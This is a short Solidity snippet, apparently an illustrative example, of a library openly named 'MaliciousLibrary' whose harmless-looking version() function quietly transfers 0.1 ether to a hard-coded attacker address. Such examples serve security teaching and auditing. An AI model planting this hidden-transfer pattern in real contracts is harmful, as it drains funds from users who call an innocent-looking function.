library MaliciousLibrary {
    function version() public returns(uint256) {
        address attacker = address(0x72...);

        attacker.transfer(0.1 ether);

        return 1;
    }
}
